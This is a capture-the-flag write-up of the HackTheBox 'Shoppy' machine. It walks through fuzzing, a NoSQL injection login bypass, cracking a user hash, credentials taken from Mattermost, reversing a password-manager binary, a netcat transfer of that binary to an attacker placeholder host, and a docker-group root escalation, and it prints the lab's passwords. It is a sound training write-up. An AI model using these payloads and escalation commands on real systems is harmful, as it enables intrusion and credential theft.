## Summary

On port 80 can be found website `shoppy.htb`.  Fuzzing website revealed login page which proved to be vulnerable to `NoSQL` Injection. I was able to bypass authentication and with the same payload exploit `Search for users` functionality. Exported file contained hashes for users admin and josh. I was able to crack hash for user josh. I could not leverage these credentials to get any further on the box so I tried sub-domain fuzzing and discovered subdomain `mattermost`. Accessing this website I was presented with Login page where I was able to use credentials for user `josh`. Inspecting dashboard I found credentials for user `jaeger` and with these credentials I was able to `ssh` in box. Enumerating system I found out that user `jeager` can run script `/home/deploy/password-manager` as user deploy with `sudo` privileges. Running this binary I got prompted for master password to access password manager. Reverse engineering binary with `ghidra` revealed this password and I was able to retrieve credentials for user `deploy`. Enumerating system as user `deploy` revealed that user is in `docker` group which was abused to escalate privileges to root.

## Enumeration

### Service Enumeration

| **IP Address** | **Ports Open** |
|-------|--------|
| 10.10.11.180 | **TCP**: 22, 80, 9093 |


#### Port 80

First I added DNS record for `shoppy.htb` hence message from `nmap` output: `Did not follow redirect to http://shoppy.htb` 

```
sudo sh -c 'echo "10.10.11.180 shoppy.htb" >> /etc/hosts'
```

##### Technology

```
nginx/1.23.1
```

##### Web Fuzzing

```
dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u http://shoppy.htb
```

![80dirsearch.png](/assets/img/Shoppy/80dirsearch.png)

##### Sub-domain Fuzzing

`ffuf` was used for discovery of `mattermost` subdomain by the use of virtual host.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H 'Host: FUZZ.shoppy.htb' -ic -fs 169
```

![vhostFuzzing.png](/assets/img/Shoppy/vhostFuzzing.png)

I added `mattermost.shoppy.htb` to my `/etc/hosts` file.

##### Website - shoppy.htb

![80.png](/assets/img/Shoppy/80.png)


![80login.png](/assets/img/Shoppy/80login.png)

Trying basic special characters for disclosing SQL Injection vulnerabilities I noticed something unusual. Using `'` as input for username and password caused website to hang for a few seconds and then server responded with `504 Gateway Time-out`.

![websiteError.png](/assets/img/Shoppy/websiteError.png)

##### Website - mattermost.shoppy.htb

## Initial Foothold

### NoSQL Injection

After trying few SQL Injection and NoSQL Injection payload I was able to bypass authentication with this payload:

```
admin' || 'a'=='a
```

According to this [source](https://book.hacktricks.xyz/pentesting-web/nosql-injection): An attacker can exploit this by inputting strings like `admin' || 'a'=='a`, making the query return all documents by satisfying the condition with a tautology (`'a'=='a'`). So this is analogous to `SQLi` authentication bypass (`admin' OR 1=1 -- //`).

![shoppyDashboard.png](/assets/img/Shoppy/shoppyDashboard.png)

`Shoppy` dashboard contains interesting functionality `Search for users`. Following the trend of NoSQL vulnerability I tried same payload to retrieve all results. 

```
admin' || 'a'=='a
```

![shoppySearch.png](/assets/img/Shoppy/shoppySearch.png)

![shoppyExport.png](/assets/img/Shoppy/shoppyExport.png)

Act of searching exported file with results which can be downloaded. Inspecting contents of this file we can see hashes for users `admin` and `josh`.

![export.png](/assets/img/Shoppy/export.png)

```
0	
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
1	
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
```

I was able to crack hash for user josh by using [crackstation](https://crackstation.net/).

![crackstation.png](/assets/img/Shoppy/crackstation.png)

```
josh : remembermethisway
```

### Mattermost Login 

With newly obtained credentials I was able to log in to `Mattermost` application as user `josh`.

```
josh : remembermethisway
```

![mattermostDashboard.png](/assets/img/Shoppy/mattermostDashboard.png)

Inspecting dashboard I found credentials for user `jaeger` inside `Deploy Machine` channel.

![mattermostCredentials.png](/assets/img/Shoppy/mattermostCredentials.png)

### SSH Login

```
jaeger : Sh0ppyBest@pp!
```

## Privilege Escalation

### System Enumeration

```
sudo -l
```

![sudoL.png](/assets/img/Shoppy/sudoL.png)

We can see that `jeager` can run script `/home/deploy/password-manager` as user deploy with `sudo` privileges. Running this binary we get prompted for master password to enter Josh password manager. Since none of the known password are valid I decided to transfer binary to my local machine for reverse engineering.

```
sudo -u deploy /home/deploy/password-manager
```

![passwordManagerBinry.png](/assets/img/Shoppy/passwordManagerBinry.png)

#### File Transfer

Transferring binary to kali machine.

On kali:
```
nc -nlvp 9989 > password-manager
```

On victim:
```
nc -w 3 <<KALI_IP>> 9989 < password-manager
```

#### Ghidra

Analyzing binary in `ghidra` we can see that variable `local_48` is our input and it is compared to variable `local_68` which is created by appending characters that make up string `Sample`.

![ghidra.png](/assets/img/Shoppy/ghidra.png)


By supplying `Sample` as master password I got new credentials for user `deploy`.

![passwordManager.png](/assets/img/Shoppy/passwordManager.png)

```
deploy : Deploying@pp!
```

### Lateral Movement

![deployLogin.png](/assets/img/Shoppy/deployLogin.png)

Upgrading TTY:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#### Linpeas

Enumerating system as user `deploy` with `linpeas` revealed that user is in `docker` group.

![linpeas1.png](/assets/img/Shoppy/linpeas1.png)

### Abusing Docker Group Permissions

Listing all Docker Images:
```
docker images
```

There is alpine image installed which we can leverage to spin up a container that will run a single command.

```
docker run --rm -it alpine sh -c "whoami"
```

![escalation1.png](/assets/img/Shoppy/escalation1.png)

Container is running with root privileges so according to [gtfobins](https://gtfobins.github.io/gtfobins/docker/) we can spawn shell with:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
